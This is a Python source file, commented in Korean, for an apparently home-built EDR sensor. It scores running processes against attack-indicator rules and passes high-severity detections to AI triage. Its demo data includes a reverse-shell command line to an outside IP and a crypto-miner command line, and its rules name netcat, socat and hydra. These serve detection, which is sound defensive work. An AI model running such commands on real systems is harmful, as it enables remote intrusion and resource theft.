"""
EDR (Endpoint Detection & Response) — AI 기반 엔드포인트 관제

CrowdStrike Falcon 스타일의 경량 EDR 센서:
  - 실행 중 프로세스를 주기적으로 스캔(psutil)해 인벤토리 구성
  - 행위 기반 공격 지표(IOA, Indicator of Attack) 룰로 위험 프로세스 탐지
  - 위험 점수(0~100) 산정 + MITRE ATT&CK 매핑
  - HIGH/CRITICAL 탐지는 threat_detector.report_alert() 로 파이프라인에 투입
      → AI 트리아지(Claude)가 정탐/오탐 판정 → SOAR 자동 대응
  - 대응: 프로세스 종료/격리 (기본 simulate — 안전장치로 시스템/자기 프로세스 보호)

실제 환경(psutil)에서 동작하며, 없으면 데모 프로세스로 fallback.
IOA 예시: /tmp 등 임시경로 실행, 리버스셸(nc/ncat/bash -i), 스캐너(nmap/masscan),
          크립토 마이너, 웹/DB 프로세스가 셸을 스폰(웹셸), 인코딩된 파워셸/base64 실행.
"""
import os
import time
import threading
from datetime import datetime
from collections import deque

from modules.logging_setup import get_logger

_log = get_logger(__name__)

try:
    import psutil
    PSUTIL_OK = True
except ImportError:
    PSUTIL_OK = False


# ── 행위 기반 공격 지표(IOA) 룰 ──
# 각 룰: (id, 설명, 심각도, MITRE technique, 가중치)  +  매칭 함수는 _evaluate 에서
SUSPICIOUS_BINARIES = {
    "nc": ("리버스/바인드 셸 도구(netcat)", "HIGH", "T1059"),
    "ncat": ("리버스/바인드 셸 도구(ncat)", "HIGH", "T1059"),
    "socat": ("터널링/셸 릴레이(socat)", "HIGH", "T1090"),
    "nmap": ("네트워크 스캐너(nmap)", "MEDIUM", "T1046"),
    "masscan": ("고속 포트 스캐너(masscan)", "HIGH", "T1046"),
    "hydra": ("무차별 대입 도구(hydra)", "HIGH", "T1110"),
    "xmrig": ("크립토 마이너(xmrig)", "CRITICAL", "T1496"),
    "minerd": ("크립토 마이너(minerd)", "CRITICAL", "T1496"),
}
# 웹/DB 서비스가 자식으로 셸을 띄우면 웹셸/RCE 의심
SHELL_NAMES = {"sh", "bash", "zsh", "dash", "ash"}
SERVER_PARENTS = {"nginx", "apache2", "httpd", "php-fpm", "node", "python",
                  "java", "mysqld", "postgres", "redis-server"}
TEMP_DIRS = ("/tmp/", "/dev/shm/", "/var/tmp/", "/run/")


# 데모 모드가 주입하는 가짜 위협 프로세스 (누적 확률, 프로세스).
#
# 여기 있는 cmdline 은 **실제 탐지가 만들어낼 수 없는 고정 문자열**이다. 그래서
# 이 목록은 "이 알림이 합성인가"를 되짚는 유일하게 확실한 단서이기도 하다
# (아카이브의 알림은 origin 이 전부 'legacy' 라 저장값으로는 가릴 수 없다).
# modules/labeling.classify_provenance 가 이 상수를 읽는다 — 복사본을 두면
# 시나리오가 바뀔 때 조용히 어긋나므로 반드시 여기만 고칠 것.
DEMO_THREAT_PROCESSES = [
    (0.10, {"ppid": 812, "name": "bash", "parent": "nginx", "user": "www-data",
            "cmdline": "bash -i >& /dev/tcp/45.155.205.233/4444 0>&1",
            "cpu": 0.8, "exe_path": "/bin/bash"}),
    (0.18, {"ppid": 1, "name": "xmrig", "parent": "systemd", "user": "nobody",
            "cmdline": "/tmp/.x/xmrig -o pool.minexmr.com:4444 -u wallet",
            "cpu": 96.4, "exe_path": "/tmp/.x/xmrig"}),
    (0.24, {"ppid": 905, "name": "nmap", "parent": "python", "user": "mintkangaroo",
            "cmdline": "nmap -sS 192.168.1.0/24", "cpu": 12.0,
            "exe_path": "/usr/bin/nmap"}),
]


class EDRSensor:
    def __init__(self, socketio, config=None, threat_detector=None,
                 mitre_tracker=None, ai_analyst=None, ip_reputation=None):
        self.socketio = socketio
        self.config = config or {}
        self.threat_detector = threat_detector
        self.mitre = mitre_tracker
        self.ai = ai_analyst
        self.ip_reputation = ip_reputation
        self.sigma = None          # app.py 에서 주입 (Sigma 룰 평가)
        self.yara = None           # wiring 에서 주입 (실행 파일 내용 검사)
        self.running = False
        self._lock = threading.Lock()

        try:
            self.scan_interval = float(self.config.get("EDR_SCAN_INTERVAL", 5))
        except (TypeError, ValueError):
            self.scan_interval = 5.0
        # 대응 모드: simulate(기본) | kill  — kill 이라도 안전장치 통과분만 실제 종료
        self.response_mode = str(self.config.get("EDR_RESPONSE_MODE", "simulate")).lower()

        self.processes = []            # 최근 스캔 인벤토리
        self.detections = deque(maxlen=300)
        self._seen_detections = set()  # (pid, rule) 중복 방지
        self._det_id = 0
        self._own_pid = os.getpid()
        self.host = self.config.get("EDR_HOST_LABEL") or _hostname()
        self.stats = {
            "mode": "off",
            "scans": 0,
            "process_count": 0,
            "detections": 0,
            "critical": 0,
            "high": 0,
            "responses": 0,      # 종료/격리 실행 수
            "responses_prevented": 0,
        }

    # ------------------------------------------------------------------ #
    #  라이프사이클
    # ------------------------------------------------------------------ #

    def start(self, demo=True):
        if self.running:
            return
        self.running = True
        real = PSUTIL_OK and not demo
        with self._lock:
            self.stats["mode"] = "real" if real else "demo"
        threading.Thread(target=self._scan_loop, args=(real,), daemon=True).start()
        if real:
            _log.info(f"[EDR] 실센서 활성 — psutil 프로세스 관제 (호스트: {self.host})")
        else:
            _log.warning("[EDR] 데모 모드 — 가상 프로세스/위협 시나리오로 동작")

    def stop(self):
        self.running = False

    # ------------------------------------------------------------------ #
    #  조회 API
    # ------------------------------------------------------------------ #

    def get_status(self):
        with self._lock:
            procs = sorted(self.processes, key=lambda p: p.get("risk", 0), reverse=True)
            return {
                "stats": dict(self.stats),
                "host": self.host,
                "response_mode": self.response_mode,
                "processes": procs[:60],
                "detections": list(reversed(list(self.detections)))[:50],
            }

    def get_detections(self, limit=50):
        with self._lock:
            return list(reversed(list(self.detections)))[:limit]

    # ------------------------------------------------------------------ #
    #  대응 (분석가/자동)
    # ------------------------------------------------------------------ #

    def kill_process(self, pid, reason="분석가 프로세스 격리"):
        """프로세스 종료. 안전장치: 자기 자신/PID 1/시스템 크리티컬은 종료 금지."""
        pid = int(pid)
        blockable, why = self._is_killable(pid)
        if not blockable:
            with self._lock:
                self.stats["responses_prevented"] += 1
            self._emit_response(pid, "prevented", f"안전장치 — {why} (종료 안 함)")
            return False, why

        result = "simulated"
        if self.response_mode == "kill" and PSUTIL_OK:
            try:
                psutil.Process(pid).terminate()
                result = "killed"
            except Exception as e:
                result = f"failed ({type(e).__name__})"
        with self._lock:
            self.stats["responses"] += 1
        self._emit_response(pid, result, reason)
        return True, result

    # ------------------------------------------------------------------ #
    #  스캔 루프
    # ------------------------------------------------------------------ #

    def _scan_loop(self, real):
        while self.running:
            try:
                snapshot = self._scan_real() if real else self._scan_demo()
                self._process_snapshot(snapshot)
            except Exception as e:
                _log.error(f"[EDR] 스캔 오류: {e}")
            for _ in range(int(self.scan_interval * 2)):
                if not self.running:
                    return
                time.sleep(0.5)

    def _scan_real(self):
        procs = []
        parent_names = {}
        try:
            for p in psutil.process_iter(["pid", "ppid", "name", "username", "cmdline",
                                          "cpu_percent", "create_time"]):
                parent_names[p.info["pid"]] = p.info.get("name") or ""
        except Exception:
            pass
        for p in psutil.process_iter(["pid", "ppid", "name", "username", "cmdline",
                                      "cpu_percent", "create_time"]):
            try:
                info = p.info
                cmd = " ".join(info.get("cmdline") or [])[:400]
                procs.append({
                    "pid": info.get("pid"),
                    "ppid": info.get("ppid"),
                    "name": info.get("name") or "?",
                    "parent": parent_names.get(info.get("ppid"), "?"),
                    "user": info.get("username") or "?",
                    "cmdline": cmd,
                    "cpu": round(info.get("cpu_percent") or 0.0, 1),
                    "exe_path": _safe_exe(p),
                })
            except Exception:
                continue
        return procs

    def _scan_demo(self):
        import random
        base = [
            {"pid": 1, "ppid": 0, "name": "systemd", "parent": "kernel",
             "user": "root", "cmdline": "/sbin/init", "cpu": 0.1, "exe_path": "/sbin/init"},
            {"pid": 812, "ppid": 1, "name": "nginx", "parent": "systemd",
             "user": "www-data", "cmdline": "nginx: worker process", "cpu": 0.4, "exe_path": "/usr/sbin/nginx"},
            {"pid": 905, "ppid": 1, "name": "python", "parent": "systemd",
             "user": "mintkangaroo", "cmdline": "python trade_bot.py --live",
             "cpu": 2.1, "exe_path": "/usr/bin/python3"},
            {"pid": 1203, "ppid": 1, "name": "sshd", "parent": "systemd",
             "user": "root", "cmdline": "/usr/sbin/sshd -D", "cpu": 0.0, "exe_path": "/usr/sbin/sshd"},
        ]
        # 20% 확률로 위협 시나리오 주입
        roll = random.random()
        for threshold, proc in DEMO_THREAT_PROCESSES:
            if roll < threshold:
                injected = dict(proc)
                injected["pid"] = random.randint(20000, 60000)
                base.append(injected)
                break
        return base

    # ------------------------------------------------------------------ #
    #  탐지 로직
    # ------------------------------------------------------------------ #

    def _process_snapshot(self, procs):
        for pr in procs:
            pr["risk"], pr["ioas"] = self._evaluate(pr)
        with self._lock:
            self.processes = procs
            self.stats["scans"] += 1
            self.stats["process_count"] = len(procs)

        for pr in procs:
            if pr["risk"] >= 40 and pr["ioas"]:
                self._raise_detection(pr)

        # Sigma 룰 엔진에도 프로세스 이벤트 공급 (업계 표준 탐지)
        if self.sigma:
            for pr in procs:
                try:
                    self.sigma.feed_process(pr)
                except Exception:
                    pass

        # YARA 로 실행 파일 자체를 검사한다. Sigma 가 '무엇을 실행했나'를 본다면
        # 여기는 '그 파일이 무엇인가'를 본다 — 이름을 바꿔 위장한 바이너리는
        # 커맨드라인만 봐서는 안 잡힌다. 같은 파일은 캐시로 한 번만 읽는다.
        if self.yara:
            try:
                self.yara.scan_process_images(procs)
            except Exception as e:
                _log.error(f"[EDR] YARA 스캔 오류: {e}")

        try:
            self.socketio.emit("edr_status", {
                "stats": dict(self.stats), "host": self.host,
                "top": sorted(procs, key=lambda p: p.get("risk", 0), reverse=True)[:8],
            })
        except Exception:
            pass

    def _evaluate(self, pr):
        """프로세스 위험 점수(0~100)와 매칭된 IOA 목록 산정."""
        risk = 0
        ioas = []
        name = (pr.get("name") or "").lower()
        cmd = (pr.get("cmdline") or "").lower()
        parent = (pr.get("parent") or "").lower()
        exe = (pr.get("exe_path") or "").lower()

        # 1) 알려진 악성/도구 바이너리
        for bin_name, (desc, sev, tech) in SUSPICIOUS_BINARIES.items():
            if name == bin_name or f"/{bin_name}" in exe or cmd.split(" ")[0].endswith(bin_name):
                ioas.append({"rule": f"IOA-BIN-{bin_name}", "desc": desc,
                             "severity": sev, "mitre": tech})
                risk += {"CRITICAL": 70, "HIGH": 45, "MEDIUM": 25}.get(sev, 20)

        # 2) 리버스 셸 패턴
        if "/dev/tcp/" in cmd or "bash -i" in cmd or "sh -i" in cmd or "0>&1" in cmd:
            ioas.append({"rule": "IOA-REVSHELL", "desc": "리버스 셸 명령 패턴",
                         "severity": "CRITICAL", "mitre": "T1059"})
            risk += 65

        # 3) 임시 경로에서 실행 (드로퍼/스테이징)
        if exe.startswith(TEMP_DIRS) or any(cmd.startswith(t) for t in TEMP_DIRS):
            ioas.append({"rule": "IOA-TMPEXEC", "desc": "임시 디렉터리에서 실행",
                         "severity": "HIGH", "mitre": "T1036"})
            risk += 40

        # 4) 웹/DB 서비스가 셸을 스폰 (웹셸/RCE)
        if name in SHELL_NAMES and parent in SERVER_PARENTS:
            ioas.append({"rule": "IOA-WEBSHELL",
                         "desc": f"{parent} 가 셸({name})을 스폰 — 웹셸/RCE 의심",
                         "severity": "CRITICAL", "mitre": "T1505"})
            risk += 60

        # 5) 인코딩/난독 실행
        if "base64 -d" in cmd or " -enc " in cmd or "frombase64string" in cmd:
            ioas.append({"rule": "IOA-ENCODED", "desc": "인코딩된 명령 실행(난독화)",
                         "severity": "HIGH", "mitre": "T1027"})
            risk += 35

        # 6) 비정상 고CPU (마이너 의심) — 이미 마이너 룰 없을 때만 소폭
        if pr.get("cpu", 0) >= 90 and not any(i["rule"].startswith("IOA-BIN") for i in ioas):
            ioas.append({"rule": "IOA-HIGHCPU", "desc": f"지속 고CPU {pr.get('cpu')}% — 마이너 의심",
                         "severity": "MEDIUM", "mitre": "T1496"})
            risk += 20

        return min(100, risk), ioas

    def _raise_detection(self, pr):
        # 프로세스별 최고 심각도 IOA 기준
        order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
        top = max(pr["ioas"], key=lambda i: order.get(i["severity"], 0))
        key = (pr["pid"], top["rule"])
        with self._lock:
            if key in self._seen_detections:
                return
            self._seen_detections.add(key)
            self._det_id += 1
            det = {
                "id": self._det_id,
                "host": self.host,
                "pid": pr["pid"],
                "process": pr["name"],
                "parent": pr.get("parent"),
                "user": pr.get("user"),
                "cmdline": pr.get("cmdline"),
                "risk": pr["risk"],
                "severity": top["severity"],
                "rule": top["rule"],
                "description": top["desc"],
                "mitre": top["mitre"],
                "ioas": pr["ioas"],
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
            self.detections.append(det)
            self.stats["detections"] += 1
            if top["severity"] == "CRITICAL":
                self.stats["critical"] += 1
            elif top["severity"] == "HIGH":
                self.stats["high"] += 1

        # 실시간 스트림
        try:
            self.socketio.emit("edr_detection", det)
        except Exception:
            pass

        # MITRE 매핑
        if self.mitre:
            try:
                self.mitre.map_threat("EDR_BEHAVIOR", src_ip=None, dst_ip=None,
                                      description=f"{det['description']} ({det['process']})")
            except Exception:
                pass

        # AI 트리아지 파이프라인에 투입 (HIGH/CRITICAL만) → Claude 정탐/오탐 판정
        if self.threat_detector and top["severity"] in ("HIGH", "CRITICAL"):
            try:
                self.threat_detector.report_alert(
                    "EDR_THREAT", top["severity"],
                    src_ip=self.host, dst_ip=None,
                    description=f"[EDR] {det['description']} — {det['process']}(pid {det['pid']}, {det['user']})",
                    details={"edr": True, "pid": det["pid"], "process": det["process"],
                             "parent": det.get("parent"), "cmdline": det.get("cmdline"),
                             "rule": det["rule"], "mitre": det["mitre"], "risk": det["risk"],
                             "ioas": det["ioas"]},
                )
            except Exception as e:
                _log.error(f"[EDR] 파이프라인 투입 오류: {e}")

    # ------------------------------------------------------------------ #
    #  대응 안전장치
    # ------------------------------------------------------------------ #

    # 종료 금지 시스템 크리티컬 프로세스
    _PROTECTED_NAMES = {"systemd", "init", "sshd", "kthreadd", "kernel",
                        "dbus-daemon", "NetworkManager", "python"}

    def _is_killable(self, pid):
        if pid <= 1:
            return False, "PID 1/시스템 프로세스"
        if pid == self._own_pid:
            return False, "SOC 대시보드 자신"
        if PSUTIL_OK:
            try:
                name = (psutil.Process(pid).name() or "").lower()
                if name in {n.lower() for n in self._PROTECTED_NAMES}:
                    return False, f"보호 프로세스({name})"
            except Exception:
                pass
        return True, None

    def _emit_response(self, pid, result, detail):
        entry = {"pid": pid, "result": result, "detail": detail,
                 "host": self.host,
                 "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        try:
            self.socketio.emit("edr_response", entry)
        except Exception:
            pass


def _hostname():
    try:
        import socket
        return socket.gethostname()
    except Exception:
        return "endpoint"


def _safe_exe(p):
    try:
        return p.exe() or ""
    except Exception:
        return ""
